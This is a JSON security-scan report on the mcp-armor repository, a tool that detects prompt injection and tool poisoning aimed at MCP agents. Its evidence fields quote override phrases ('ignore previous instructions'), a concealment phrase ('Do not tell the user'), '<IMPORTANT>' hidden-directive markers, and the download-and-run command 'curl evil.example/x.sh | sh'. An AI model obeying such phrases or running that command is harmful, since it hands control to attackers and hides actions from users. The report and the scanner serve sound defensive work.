@@ -1,0 +1,281 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "studiomeyer-io/mcp-armor",
+    "version": "8ce3b5002db8c9b59831a21f2c111508922a0050",
+    "download": "https://codeload.github.com/studiomeyer-io/mcp-armor/tar.gz/8ce3b5002db8c9b59831a21f2c111508922a0050"
+  },
+  "archive_sha256": "4f554112967349d2adfe29373a9931db6e758941799607cb000ac67de44360f2",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/benches/scanner.rs",
+      "line": 29,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "59511b78f3f359a455d07a90cbb84b48d0f7259f745009f33fca839c53dd2e6e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/regex_stage.rs",
+      "line": 289,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "96ccfe5b34296732cdfcaab238c0db5da5e9064af50ff0cf98dae4782b11a926"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/mod.rs",
+      "line": 476,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "7b7a62ecc817995122d62205ee94ee1acfca6ee34abde4e710d806531b676e28"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/mod.rs",
+      "line": 456,
+      "evidence": "curl evil.example/x.sh | sh",
+      "file_sha256": "7b7a62ecc817995122d62205ee94ee1acfca6ee34abde4e710d806531b676e28"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/override_variants.rs",
+      "line": 29,
+      "evidence": "ignore earlier instructions",
+      "file_sha256": "f7edbef38dd9ad196356da13b3faede0f3aae14040d85bcb603f0edb232bbddd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/tool_poison.rs",
+      "line": 145,
+      "evidence": "ignore prior instructions",
+      "file_sha256": "ecbfe0ab8e3f3ef281f54b190474788f88cb4d1e6b0594cd7cb20d72f3f1a462"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/tool_poison.rs",
+      "line": 576,
+      "evidence": "Do not tell the user",
+      "file_sha256": "ecbfe0ab8e3f3ef281f54b190474788f88cb4d1e6b0594cd7cb20d72f3f1a462"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/tool_poison.rs",
+      "line": 576,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "ecbfe0ab8e3f3ef281f54b190474788f88cb4d1e6b0594cd7cb20d72f3f1a462"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/confusable.rs",
+      "line": 238,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "90f8cbb7a1e1b95145af474e7a5eadd1cfbb42066915729d2798020174b24385"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/scanner/unicode.rs",
+      "line": 296,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "f7442319894b53024af93913bccecd07c5d54f821c5c48ef4fb68c9e33c5c876"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/proxy/stdio.rs",
+      "line": 1358,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "14401e7b64aeaafbee5522548103c094287b28216f4e32629ad1368a25de5812"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/proxy/stdio.rs",
+      "line": 1358,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "14401e7b64aeaafbee5522548103c094287b28216f4e32629ad1368a25de5812"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/src/control/mod.rs",
+      "line": 660,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "cfb4e7116647126b3263ca97a352e9181907bfd8cf7415dbc4b6eb35fc0145f7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/cve-feed/simulations.toml",
+      "line": 37,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "9f723c1339af40296ba4a4222f1ce20fd83aa67cf9de0cc3f6017c5bdf7265b1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/cve-feed/simulations.toml",
+      "line": 9,
+      "evidence": "curl http://evil.example/x.sh | sh",
+      "file_sha256": "9f723c1339af40296ba4a4222f1ce20fd83aa67cf9de0cc3f6017c5bdf7265b1"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/README.md",
+      "line": 168,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "f0dc6080e98c3de99de68d742bbcd37d4e41ea898d859ba530acc7c47632b813"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/README.md",
+      "line": 77,
+      "evidence": "curl evil.example/x.sh | sh",
+      "file_sha256": "f0dc6080e98c3de99de68d742bbcd37d4e41ea898d859ba530acc7c47632b813"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/CHANGELOG.md",
+      "line": 34,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "93963ebed913125cdb65e1f9aa998bc6488e880ff7ced55c0183528be16f160e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/integration_field_context.rs",
+      "line": 82,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "13917f53af305f57d7c07c6903bdcda96a19ec8d73ffc34659cb0e07eb091307"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/instruction_override_variants.rs",
+      "line": 5,
+      "evidence": "ignore ALL previous instructions",
+      "file_sha256": "b78f0eb419ff5e29221af5640beb6975ee7d5e882c409ae72e5d58d8d997b4f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/fixtures/rpc_upstream.py",
+      "line": 26,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "1e3a327484dd180af1694df4a4fd242b3fa72677aee099ddd0555b5f10825bf1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/integration_v03_features.rs",
+      "line": 86,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "7999b6b7282469ac9953b856eccb5bf381da9cfc12198374669dd664513fa8a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/integration_tool_name_collision_v07.rs",
+      "line": 7,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "41fe1c1072eed0bec0110b94acf836dfc4736962612563443135647b02a99d18"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/perf_gate.rs",
+      "line": 76,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "10d1e2c5f0da6f484e062799093e5cfbce301e6c9fe9cc13a5c9be34b74864c5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/integration_tool_poison_v08.rs",
+      "line": 52,
+      "evidence": "Ignore all prior instructions",
+      "file_sha256": "6fbe5373155011b4ee7f0b22306d7b34ae1ed87d14b7526fa95f266b53e53b35"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/integration_tool_poison_v08.rs",
+      "line": 29,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "6fbe5373155011b4ee7f0b22306d7b34ae1ed87d14b7526fa95f266b53e53b35"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-armor-8ce3b5002db8c9b59831a21f2c111508922a0050/tests/integration_control.rs",
+      "line": 78,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d19b8bab9ddf0e200e2525d93ea840f7d733a5feac54cb5dd1d2db9a56a27dc5"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "api.scorecard.dev",
+    "attacker.example",
+    "crates.io",
+    "evil.example",
+    "example.com",
+    "example.test",
+    "ghcr.io",
+    "github.com",
+    "howardhinnant.github.io",
+    "img.shields.io",
+    "keepachangelog.com",
+    "log2025-1.rekor.sigstore.dev",
+    "nvd.nist.gov",
+    "rekor.sigstore.dev",
+    "scorecard.dev",
+    "semver.org",
+    "static.modelcontextprotocol.io",
+    "studiomeyer.io",
+    "www.ox.security",
+    "www.unicode.org"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
